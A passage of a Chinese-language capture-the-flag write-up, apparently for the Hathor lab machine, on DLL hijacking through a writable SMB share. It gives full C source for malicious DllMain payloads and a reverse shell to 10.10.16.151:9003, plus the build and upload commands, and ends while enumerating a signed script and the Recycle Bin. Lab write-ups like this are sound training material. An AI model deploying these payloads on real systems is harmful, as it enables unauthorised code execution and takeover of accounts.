-rw-rw-rw-       1794  Sun Jan 23 05:54:21 2022 _7ZipAdd_Example.au3
-rw-rw-rw-       1855  Sun Jan 23 05:54:21 2022 _7ZipAdd_Example_using_Callback.au3
-rw-rw-rw-        334  Sun Jan 23 05:54:21 2022 _7ZipDelete_Example.au3
-rw-rw-rw-        859  Sun Jan 23 05:54:21 2022 _7ZIPExtractEx_Example.au3
-rw-rw-rw-       1867  Sun Jan 23 05:54:21 2022 _7ZIPExtractEx_Example_using_Callback.au3
-rw-rw-rw-        830  Sun Jan 23 05:54:21 2022 _7ZIPExtract_Example.au3
-rw-rw-rw-       2027  Sun Jan 23 05:54:21 2022 _7ZipFindFirst__7ZipFindNext_Example.au3
-rw-rw-rw-        372  Sun Jan 23 05:54:21 2022 _7ZIPUpdate_Example.au3
-rw-rw-rw-        886  Sun Jan 23 05:54:21 2022 _Archive_Size.au3
-rw-rw-rw-        201  Sun Jan 23 05:54:21 2022 _CheckExample.au3
-rw-rw-rw-        144  Sun Jan 23 05:54:21 2022 _GetZipListExample.au3
-rw-rw-rw-        498  Sun Jan 23 05:54:21 2022 _MiscExamples.au3
```

根目录是 `AutoIt3_x64.exe`、`Bginfo64.exe`、`script`。`script` 里是 AutoIt 的 7-zip UDF 以及它要加载的 `7-zip64.dll`

将原始文件备份到本地。其中 lcd 是连接本地的 `share_backup` 文件夹。

```bash
# lcd /home/kali/Work/Kali/Hathor/share_backup
/home/kali/Work/Kali/Hathor/share_backup
# get 7-zip64.dll
# cd ..
# get AutoIt3_x64.exe
# get Bginfo64.exe
```

解释一下：
1. `shell printf 'probe\n' > probe.txt`：shell 是 impacket-smbclient 的本地执行命令
2. `put probe.txt`：上传到远端当前目录

经过测试 `.dll；.txt` 能写，`.exe` 不能写。

```bash
# shell printf 'probe\n' > probe.txt

# put probe.txt
# shell cp probe.txt probe.dll

# put probe.dll
# shell cp probe.txt probe.exe

# put probe.exe
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

```

写一个做 ping 和枚举的 DLL，用于验证被加载执行。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ cat dll.c
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c ping -n 4 10.10.16.151");
        system("cmd.exe /c whoami /all > C:\\Users\\Public\\me.txt");
        system("cmd.exe /c icacls C:\\share >> C:\\Users\\Public\\me.txt");
        system("cmd.exe /c icacls C:\\share\\* >> C:\\Users\\Public\\me.txt");
        system("cmd.exe /c icacls C:\\share\\scripts\\* >> C:\\Users\\Public\\me.txt");
    }
    return TRUE;
}
```

确认 mingw 可用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ which x86_64-w64-mingw32-gcc || sudo apt install -y mingw-w64
/usr/bin/x86_64-w64-mingw32-gcc
```

编译成 x64 DLL。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ x86_64-w64-mingw32-gcc -shared -O2 -s -o 7-zip64.dll dll.c
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ file 7-zip64.dll
7-zip64.dll: PE32+ executable for MS Windows 5.02 (DLL), x86-64 (stripped to external PDB), 10 sections
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ ls -liah 7-zip64.dll
4348275 -rwxrwxr-x 1 kali kali 12K Sep 21 04:36 7-zip64.dll
```

覆盖 `scripts\7-zip64.dll`。

```bash
# lcd ..
..
# put 7-zip64.dll
# ls 7-zip64.dll
-rw-rw-rw-      12288  Mon Sep 21 04:44:44 2026 7-zip64.dll

```

抓到 ICMP 请求，代码执行成立。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ sudo tcpdump -ni tun0 icmp

[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
04:45:49.302504 IP 10.129.230.109 > 10.10.16.151: ICMP echo request, id 1, seq 8102, length 40
04:45:49.302644 IP 10.10.16.151 > 10.129.230.109: ICMP echo reply, id 1, seq 8102, length 40
04:45:50.313591 IP 10.129.230.109 > 10.10.16.151: ICMP echo request, id 1, seq 8104, length 40
04:45:50.313611 IP 10.10.16.151 > 10.129.230.109: ICMP echo reply, id 1, seq 8104, length 40
04:45:51.329244 IP 10.129.230.109 > 10.10.16.151: ICMP echo request, id 1, seq 8106, length 40
04:45:51.329260 IP 10.10.16.151 > 10.129.230.109: ICMP echo reply, id 1, seq 8106, length 40
04:45:52.344702 IP 10.129.230.109 > 10.10.16.151: ICMP echo request, id 1, seq 8108, length 40
04:45:52.344742 IP 10.10.16.151 > 10.129.230.109: ICMP echo reply, id 1, seq 8108, length 40
```

在反弹的会话中也能看到 me.txt。

```bash
ir C:\Users\Public & echo .DONE.                                                                                             
                                                                                                                              
 Volume in drive C has no label.                                                                                              
 Volume Serial Number is BE61-D5E0                                                                                            
                                                                                                                              
 Directory of C:\Users\Public                                                                                                 
                                                                                                                              
09/21/2026  10:45 AM    <DIR>          .                                                                                      
02/16/2022  11:00 PM    <DIR>          ..                                                                                     
09/24/2021  08:27 AM    <DIR>          Documents                                                                              
09/15/2018  09:19 AM    <DIR>          Downloads                                                                              
09/21/2026  10:48 AM            11,072 me.txt                                                                                 
09/15/2018  09:19 AM    <DIR>          Music                                                                                  
09/15/2018  09:19 AM    <DIR>          Pictures                                                                               
09/15/2018  09:19 AM    <DIR>          Videos                                                                                 
               1 File(s)         11,072 bytes                                                                                 
               7 Dir(s)   9,350,332,416 bytes free                                                                            
.DONE.
```

```bash
type C:\Users\Public\me.txt & echo .DONE.                                                                                     
                                                                                                                              
                                                                                                                              
USER INFORMATION                                                                                                              
----------------                                                                                                              
                                                                                                                              
User Name         SID                                                                                                         
================= ==============================================                                                              
windcorp\ginawild S-1-5-21-3783586571-2109290616-3725730865-2663                                                              
                                                                                                                              

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes         

========================================== ================ ============================================== ===================
===============================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, En
abled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, En
abled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                   Mandatory group, En
abled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                   Group used for deny
 only                          
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, En
abled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, En
abled by default, Enabled group                                                                                               
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, En
abled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, En
abled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, En
abled by default, Enabled group
WINDCORP\ITDep                             Group            S-1-5-21-3783586571-2109290616-3725730865-9601 Mandatory group, En
abled by default, Enabled group
WINDCORP\Protected Users                   Group            S-1-5-21-3783586571-2109290616-3725730865-525  Mandatory group, En
abled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, En
abled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192 
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
C:\share NT AUTHORITY\IUSR:(OI)(CI)(N)
         BUILTIN\IIS_IUSRS:(OI)(CI)(N)
         WINDCORP\web:(OI)(CI)(N)
         CREATOR OWNER:(OI)(CI)(IO)(M,WO,DC)
         NT AUTHORITY\SYSTEM:(OI)(CI)(F)
         WINDCORP\ITDep:(OI)(IO)(RX,WO)
         WINDCORP\ITDep:(WO,S)
         BUILTIN\Administrators:(OI)(CI)(F)
         BUILTIN\Users:(OI)(IO)(RX)
         BUILTIN\Users:(RX,W)

Successfully processed 1 files; Failed processing 0 files
C:\share\AutoIt3_x64.exe NT AUTHORITY\IUSR:(N)
                         BUILTIN\IIS_IUSRS:(N)
                         NT AUTHORITY\SYSTEM:(F)
                         BUILTIN\Administrators:(F)
                         BUILTIN\Users:(RX)
                         WINDCORP\ITDep:(RX,DC)

C:\share\Bginfo64.exe NT AUTHORITY\IUSR:(I)(N)
                      BUILTIN\IIS_IUSRS:(I)(N)
                      WINDCORP\web:(I)(N)
                      BUILTIN\Administrators:(I)(M,WO,DC)
                      NT AUTHORITY\SYSTEM:(I)(F)
                      WINDCORP\ITDep:(I)(RX,WO)
                      BUILTIN\Administrators:(I)(F)
                      BUILTIN\Users:(I)(RX)

C:\share\scripts BUILTIN\IIS_IUSRS:(OI)(CI)(DENY)(RX)
                 NT AUTHORITY\IUSR:(OI)(CI)(DENY)(RX)
                 BUILTIN\Administrators:(OI)(CI)(F)
                 CREATOR OWNER:(OI)(CI)(IO)(M,WO,DC)
                 WINDCORP\ITDep:(OI)(IO)(RX,DC)
                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
                 BUILTIN\Users:(OI)(CI)(RX)
                 
Successfully processed 3 files; Failed processing 0 files
C:\share\scripts\7-zip64.dll BUILTIN\Users:(RX,W)
                             BUILTIN\IIS_IUSRS:(I)(DENY)(RX)
                             NT AUTHORITY\IUSR:(I)(DENY)(RX)
                             BUILTIN\Administrators:(I)(F)
                             WINDCORP\ITDep:(I)(RX,DC)
                             NT AUTHORITY\SYSTEM:(I)(F)
                             BUILTIN\Users:(I)(RX)

C:\share\scripts\7Zip.au3 BUILTIN\IIS_IUSRS:(I)(DENY)(RX)
                          NT AUTHORITY\IUSR:(I)(DENY)(RX)
                          BUILTIN\Administrators:(I)(F)
                          WINDCORP\ITDep:(I)(RX,DC)
                          NT AUTHORITY\SYSTEM:(I)(F)
                          BUILTIN\Users:(I)(RX)

C:\share\scripts\ZipExample.zip BUILTIN\IIS_IUSRS:(I)(DENY)(RX)
                                NT AUTHORITY\IUSR:(I)(DENY)(RX)
                                BUILTIN\Administrators:(I)(F)
                                WINDCORP\ITDep:(I)(RX,DC)
                                NT AUTHORITY\SYSTEM:(I)(F)
                                BUILTIN\Users:(I)(RX)

C:\share\scripts\_7ZipAdd_Example.au3 BUILTIN\IIS_IUSRS:(I)(DENY)(RX)
                                      NT AUTHORITY\IUSR:(I)(DENY)(RX)
                                      BUILTIN\Administrators:(I)(F)
                                      WINDCORP\ITDep:(I)(RX,DC)
                                      NT AUTHORITY\SYSTEM:(I)(F)
                                      BUILTIN\Users:(I)(RX)
C:\share\scripts\_7ZipAdd_Example_using_Callback.au3 BUILTIN\IIS_IUSRS:(I)(DENY)(RX)
                                                     NT AUTHORITY\IUSR:(I)(DENY)(RX)
                                                     BUILTIN\Administrators:(I)(F)
                                                     WINDCORP\ITDep:(I)(RX,DC)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Users:(I)(RX)

C:\share\scripts\_7ZipDelete_Example.au3 BUILTIN\IIS_IUSRS:(I)(DENY)(RX)
                                         NT AUTHORITY\IUSR:(I)(DENY)(RX)
                                         BUILTIN\Administrators:(I)(F)
                                         WINDCORP\ITDep:(I)(RX,DC)
                                         NT AUTHORITY\SYSTEM:(I)(F)
                                         BUILTIN\Users:(I)(RX)

C:\share\scripts\_7ZIPExtractEx_Example.au3 BUILTIN\IIS_IUSRS:(I)(DENY)(RX)
                                            NT AUTHORITY\IUSR:(I)(DENY)(RX)
                                            BUILTIN\Administrators:(I)(F)
                                            WINDCORP\ITDep:(I)(RX,DC)
                                            NT AUTHORITY\SYSTEM:(I)(F)
                                            BUILTIN\Users:(I)(RX)

C:\share\scripts\_7ZIPExtractEx_Example_using_Callback.au3 BUILTIN\IIS_IUSRS:(I)(DENY)(RX)
                                                           NT AUTHORITY\IUSR:(I)(DENY)(RX)
                                                           BUILTIN\Administrators:(I)(F)
                                                           WINDCORP\ITDep:(I)(RX,DC)
                                                           NT AUTHORITY\SYSTEM:(I)(F)
                                                           BUILTIN\Users:(I)(RX)
                                                
C:\share\scripts\_7ZIPExtract_Example.au3 BUILTIN\IIS_IUSRS:(I)(DENY)(RX)
                                          NT AUTHORITY\IUSR:(I)(DENY)(RX)
                                          BUILTIN\Administrators:(I)(F)
                                          WINDCORP\ITDep:(I)(RX,DC)
                                          NT AUTHORITY\SYSTEM:(I)(F)
                                          BUILTIN\Users:(I)(RX)

C:\share\scripts\_7ZipFindFirst__7ZipFindNext_Example.au3 BUILTIN\IIS_IUSRS:(I)(DENY)(RX)
                                                          NT AUTHORITY\IUSR:(I)(DENY)(RX)
                                                          BUILTIN\Administrators:(I)(F)
                                                          WINDCORP\ITDep:(I)(RX,DC)
                                                          NT AUTHORITY\SYSTEM:(I)(F)
                                                          BUILTIN\Users:(I)(RX)

C:\share\scripts\_7ZIPUpdate_Example.au3 BUILTIN\IIS_IUSRS:(I)(DENY)(RX)
                                         NT AUTHORITY\IUSR:(I)(DENY)(RX)
                                         BUILTIN\Administrators:(I)(F)
                                         WINDCORP\ITDep:(I)(RX,DC)
                                         NT AUTHORITY\SYSTEM:(I)(F)
                                         BUILTIN\Users:(I)(RX)

C:\share\scripts\_Archive_Size.au3 BUILTIN\IIS_IUSRS:(I)(DENY)(RX)
                                   NT AUTHORITY\IUSR:(I)(DENY)(RX)
                                   BUILTIN\Administrators:(I)(F)
                                   WINDCORP\ITDep:(I)(RX,DC)
                                   NT AUTHORITY\SYSTEM:(I)(F)
                                   BUILTIN\Users:(I)(RX)
C:\share\scripts\_CheckExample.au3 BUILTIN\IIS_IUSRS:(I)(DENY)(RX)
                                   NT AUTHORITY\IUSR:(I)(DENY)(RX)
                                   BUILTIN\Administrators:(I)(F)
                                   WINDCORP\ITDep:(I)(RX,DC)
                                   NT AUTHORITY\SYSTEM:(I)(F)
                                   BUILTIN\Users:(I)(RX)

C:\share\scripts\_GetZipListExample.au3 BUILTIN\IIS_IUSRS:(I)(DENY)(RX)
                                        NT AUTHORITY\IUSR:(I)(DENY)(RX)
                                        BUILTIN\Administrators:(I)(F)
                                        WINDCORP\ITDep:(I)(RX,DC)
                                        NT AUTHORITY\SYSTEM:(I)(F)
                                        BUILTIN\Users:(I)(RX)

C:\share\scripts\_MiscExamples.au3 BUILTIN\IIS_IUSRS:(I)(DENY)(RX)
                                   NT AUTHORITY\IUSR:(I)(DENY)(RX)
                                   BUILTIN\Administrators:(I)(F)
                                   WINDCORP\ITDep:(I)(RX,DC)
                                   NT AUTHORITY\SYSTEM:(I)(F)
                                   BUILTIN\Users:(I)(RX)

Successfully processed 15 files; Failed processing 0 files
.DONE.
```

加载的 DLL 计划任务以 `windcorp\ginawild` 身份运行，属于 `ITDep` 组。C:\share\scripts\7-zip64.dll 对 BUILTIN\Users 可写。

编写一个反连 exe 的 c 源文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ cat sh.c
#include <winsock2.h>
#include <windows.h>

int main(void) {
    WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    struct sockaddr_in a; a.sin_family = AF_INET;
    a.sin_port = htons(9003);
    a.sin_addr.s_addr = inet_addr("10.10.16.151");   // 你的 tun0 IP
    if (WSAConnect(s, (SOCKADDR*)&a, sizeof(a), NULL, NULL, NULL, NULL) == SOCKET_ERROR) return 1;
    STARTUPINFO si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    return 0;
}
```

编译。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ x86_64-w64-mingw32-gcc -O2 -s -o sh.exe sh.c -lws2_32
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ file sh.exe && ls -l sh.exe
sh.exe: PE32+ executable for MS Windows 5.02 (console), x86-64 (stripped to external PDB), 9 sections
-rwxrwxr-x 1 kali kali 15360 Sep 21 05:14 sh.exe
```

改名为 txt。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ cp sh.exe sh.txt
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor/Nmap]
└─$ impacket-smbclient -k windcorp.htb/beatricemill@hathor.windcorp.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# use share
# ls
drw-rw-rw-          0  Mon Sep 21 05:08:58 2026 .
drw-rw-rw-          0  Tue Apr 19 08:45:15 2022 ..
-rw-rw-rw-    1013928  Mon Sep 21 05:09:02 2026 AutoIt3_x64.exe
-rw-rw-rw-    4601208  Mon Sep 21 05:12:31 2026 Bginfo64.exe
drw-rw-rw-          0  Mon Mar 21 17:22:59 2022 scripts
# lcd ..
# put sh.txt
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ cat dll2.c
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c takeown /F C:\\share\\Bginfo64.exe");
        system("cmd.exe /c cacls C:\\share\\Bginfo64.exe /E /G ginawild:F");
        system("cmd.exe /c copy /Y C:\\share\\sh.txt C:\\share\\Bginfo64.exe");
        system("cmd.exe /c C:\\share\\Bginfo64.exe");
    }
    return TRUE;
}
```

用同样的操作覆盖。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ ls -l dll2.c && head -3 dll2.c
-rw-rw-r-- 1 kali kali 457 Sep 21 05:19 dll2.c
#include <windows.h>
#include <stdlib.h>
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ x86_64-w64-mingw32-gcc -shared -O2 -s -o 7-zip64.dll dll2.c
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ file 7-zip64.dll && ls -l 7-zip64.dll

7-zip64.dll: PE32+ executable for MS Windows 5.02 (DLL), x86-64 (stripped to external PDB), 10 sections
-rwxrwxr-x 1 kali kali 12288 Sep 21 05:20 7-zip64.dll
```

```bash
# ls
drw-rw-rw-          0  Mon Sep 21 05:18:59 2026 .
drw-rw-rw-          0  Tue Apr 19 08:45:15 2022 ..
-rw-rw-rw-    1013928  Mon Sep 21 05:21:02 2026 AutoIt3_x64.exe
-rw-rw-rw-    4601208  Mon Sep 21 05:21:31 2026 Bginfo64.exe
drw-rw-rw-          0  Mon Mar 21 17:22:59 2022 scripts
# put /home/kali/Work/Kali/Hathor/sh.txt
# ls sh.txt
-rw-rw-rw-      15360  Mon Sep 21 05:22:54 2026 sh.txt
# cd scripts
# put /home/kali/Work/Kali/Hathor/7-zip64.dll
# ls 7-zip64.dll
-rw-rw-rw-      12288  Mon Sep 21 05:23:12 2026 7-zip64.dll

```

得到 ginawild。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Hathor]
└─$ sudo rlwrap -cAr nc -lnvp 9003

[sudo] password for kali: 
listening on [any] 9003 ...
connect to [10.10.16.151] from (UNKNOWN) [10.129.230.109] 61540
Microsoft Windows [Version 10.0.20348.643]
(c) Microsoft Corporation. All rights reserved.

c:\share>whoami
whoami
windcorp\ginawild
```

查看这个账号的权限。

```bash
c:\share>whoami /all                                                                                                          
whoami /all                                                                                                                   
                                                                                                                              
USER INFORMATION                                                                                                              
----------------                                                                                                              
                                                                                                                              
User Name         SID                                                                                                         
================= ==============================================                                                              
windcorp\ginawild S-1-5-21-3783586571-2109290616-3725730865-2663                                                              
                                                                                                                              
                                                                                                                              
GROUP INFORMATION                                                                                                             
-----------------                                                                                                             
                                                                                                                              
Group Name                                 Type             SID                                            Attributes         
                                                                                                                              
========================================== ================ ============================================== ===================
===============================                                                                                               
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, En
abled by default, Enabled group                                                                                               
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, En
abled by default, Enabled group                                                                                               
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                   Mandatory group, En
abled by default, Enabled group                                                                                               
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                   Group used for deny
 only                                                                                                                         
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, En
abled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, En
abled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, En
abled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, En
abled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, En
abled by default, Enabled group
WINDCORP\ITDep                             Group            S-1-5-21-3783586571-2109290616-3725730865-9601 Mandatory group, En
abled by default, Enabled group
WINDCORP\Protected Users                   Group            S-1-5-21-3783586571-2109290616-3725730865-525  Mandatory group, En
abled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, En
abled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                       



PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

gonawild 属于 WinDCORP\ITDep 与 WINDCORP\Protected Users。

发现一个脚本，这个脚本用 eventcreate 写一个 Event ID 444 的日志。

```bash
c:\share>type C:\Get-bADpasswords\run.vbs                                                                                     
type C:\Get-bADpasswords\run.vbs                                                                                              
Set WshShell = CreateObject("WScript.Shell")                                                                                  
Command = "eventcreate /T Information /ID 444 /L Application /D " & _                                                         
    Chr(34) & "Check passwords" & Chr(34)                                                                                     
WshShell.Run Command                                                                                                          
'' SIG '' Begin signature block                                                                                               
'' SIG '' MIIIkgYJKoZIhvcNAQcCoIIIgzCCCH8CAQExDzANBglg                                                                        
'' SIG '' hkgBZQMEAgEFADB3BgorBgEEAYI3AgEEoGkwZzAyBgor                                                                        
'' SIG '' BgEEAYI3AgEeMCQCAQEEEE7wKRaZJ7VNj+Ws4Q8X66sC                                                                        
'' SIG '' AQACAQACAQACAQACAQAwMTANBglghkgBZQMEAgEFAAQg                                                                        
'' SIG '' V4iIgvjS/tzbdg7yzPOhQtBxr63sSQYGiJME4+J1oz6g                                                                        
'' SIG '' ggXTMIIFzzCCBLegAwIBAgITIAAAAAdbcJwdN1cU7gAA         
'' SIG '' AAAABzANBgkqhkiG9w0BAQsFADBOMRMwEQYKCZImiZPy         
'' SIG '' LGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYId2luZGNv         
'' SIG '' cnAxHTAbBgNVBAMTFHdpbmRjb3JwLUhBVEhPUi1DQS0x         
'' SIG '' MB4XDTIyMTAxMjE4MzAyM1oXDTMyMTAwOTE4MzAyM1ow         
'' SIG '' VzETMBEGCgmSJomT8ixkARkWA2h0YjEYMBYGCgmSJomT         
'' SIG '' 8ixkARkWCHdpbmRjb3JwMQ4wDAYDVQQDEwVVc2VyczEW         
'' SIG '' MBQGA1UEAxMNQWRtaW5pc3RyYXRvcjCCASIwDQYJKoZI         
'' SIG '' hvcNAQEBBQADggEPADCCAQoCggEBAOCsWmgMuC3A7kFR         
'' SIG '' SV3ThIJHkRW+wg/h+YsgV4SLZ6fE8D1rZBx0MTLaNt8g         
'' SIG '' xyRiQNDCXRqERx1i3QpCjAbVWDEH7Kf4OTNVGMNg1QUL         
'' SIG '' JUi7nkB42SGVFW3Bs8sVzOC7p60dNs0YoDpX6thYNUje         
'' SIG '' AGm/UEHd/EiMf512l0ND01rh+HieEQR4p76OR1+qel3+         
'' SIG '' W9+J0RWybE90EAwxFlD6wnig0JyVimnWw0/8ZJ/pJtlg
'' SIG '' QGGNX0WlebyC5RgwCfw2Edbm4LtqQ8vFKPk1G1SIniJn         
'' SIG '' A1pYhoMV5wi9QeZhH+FHgL+JHTzqcmxWhh6AuqZ2OEoN         
'' SIG '' EfUmmzPSeGtKK1UDFSUCAwEAAaOCApswggKXMD0GCSsG         
'' SIG '' AQQBgjcVBwQwMC4GJisGAQQBgjcVCILUznCD1qdohvWR         
'' SIG '' EYToiS+G+41kgSqBkDyC69BtAgFlAgEAMBMGA1UdJQQM         
'' SIG '' MAoGCCsGAQUFBwMDMA4GA1UdDwEB/wQEAwIHgDAbBgkr         
'' SIG '' BgEEAYI3FQoEDjAMMAoGCCsGAQUFBwMDMB0GA1UdDgQW         
'' SIG '' BBSRtmNDqnEAXEVStyjbKqzLwRyUgzAfBgNVHSMEGDAW         
'' SIG '' gBTxjkqkbc2CsGldYvNjmn6LbnL2WTCB0gYDVR0fBIHK         
'' SIG '' MIHHMIHEoIHBoIG+hoG7bGRhcDovLy9DTj13aW5kY29y         
'' SIG '' cC1IQVRIT1ItQ0EtMSxDTj1oYXRob3IsQ049Q0RQLENO         
'' SIG '' PVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp         
'' SIG '' Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9d2luZGNvcnAs         
'' SIG '' REM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/         
'' SIG '' YmFzZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Q         
'' SIG '' b2ludDCBxwYIKwYBBQUHAQEEgbowgbcwgbQGCCsGAQUF         
'' SIG '' BzAChoGnbGRhcDovLy9DTj13aW5kY29ycC1IQVRIT1It         
'' SIG '' Q0EtMSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2Vy         
'' SIG '' dmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv         
'' SIG '' bixEQz13aW5kY29ycCxEQz1odGI/Y0FDZXJ0aWZpY2F0         
'' SIG '' ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25B         
'' SIG '' dXRob3JpdHkwNQYDVR0RBC4wLKAqBgorBgEEAYI3FAID         
'' SIG '' oBwMGmFkbWluaXN0cmF0b3JAd2luZGNvcnAuaHRiMA0G         
'' SIG '' CSqGSIb3DQEBCwUAA4IBAQAbp0/YFh2yKjHp2+vaPfOQ         
'' SIG '' t8bUtjIuiBDfXckT/a7+ym1UI+x38RIg+Uey77Ww9Oxy         
'' SIG '' Yg/xPQTU/JC+QNZTtDefWDknn/oXvL2QT/z9ox8vIOw6         
'' SIG '' TkCS2pdMAv6R27J1J3ba5Rhb1lAbIo++32ZnQbNWwAa7         
'' SIG '' DQcymBRy1o6L/jY0FFqY5aQcAcCoYm9S+FKivuQLu0eL         
'' SIG '' x3PuuviDtsWqO6qYwWSfkCOYGRzdVTgD/hUOC1GYMsRl
'' SIG '' NFNbQKSDtZbcvkWPIZsa9Nww1FYUWOh5YiILwnyayuCr         
'' SIG '' pTVvmxla555SGRMLaCz6IMPevqXuhOGb+W/P/gAaop7d         
'' SIG '' d0VbnbPOfQTfMYICFzCCAhMCAQEwZTBOMRMwEQYKCZIm         
'' SIG '' iZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYId2lu         
'' SIG '' ZGNvcnAxHTAbBgNVBAMTFHdpbmRjb3JwLUhBVEhPUi1D         
'' SIG '' QS0xAhMgAAAAB1twnB03VxTuAAAAAAAHMA0GCWCGSAFl         
'' SIG '' AwQCAQUAoIGEMBgGCisGAQQBgjcCAQwxCjAIoAKAAKEC         
'' SIG '' gAAwGQYJKoZIhvcNAQkDMQwGCisGAQQBgjcCAQQwHAYK         
'' SIG '' KwYBBAGCNwIBCzEOMAwGCisGAQQBgjcCARUwLwYJKoZI         
'' SIG '' hvcNAQkEMSIEIMAMrS4wO7Di3pqZtBcXNwHEE7EmF+k2         
'' SIG '' G6qrSRH1n28EMA0GCSqGSIb3DQEBAQUABIIBANNeMMbj         
'' SIG '' vGfNxmTbdqaeieDzad1W9KRj5aqQXOZjlM+pmmYvY+HG         
'' SIG '' SziQXTPxjiH2GmxHEky11VoM7A0YSgRhhDxRgoF6zYVg         
'' SIG '' ZQA+unmOZYg8Eas8azZkoEVD7e6119dqev6P5rpN+v7i         
'' SIG '' jjTCd0A8yyfY0P1x064sBd+G8mv0WerKyTf+Tk7m7HmJ         
'' SIG '' aU/U6guhCvE5ipk/3or0oT509OeDDqKijeL3wkIN+YGs         
'' SIG '' tM0sIX9xzrCdC3pUCznVu/16+8qCNF11kROH9UI5WNxW         
'' SIG '' nIc54rkc71MzZup+N0L5cxTDKnmUDW99XRcjwNeRGQdx         
'' SIG '' lQgfLUl5qzTK6aRKc/nPVHD+yyQ=
'' SIG '' End signature block
```

去回收站找这个签名证书的私钥。

```bash
c:\share>dir /a C:\$Recycle.Bin

dir /a C:\$Recycle.Bin
 Volume in drive C has no label.
 Volume Serial Number is BE61-D5E0

 Directory of C:\$Recycle.Bin

02/14/2022  08:48 PM    <DIR>          .
04/19/2022  02:45 PM    <DIR>          ..
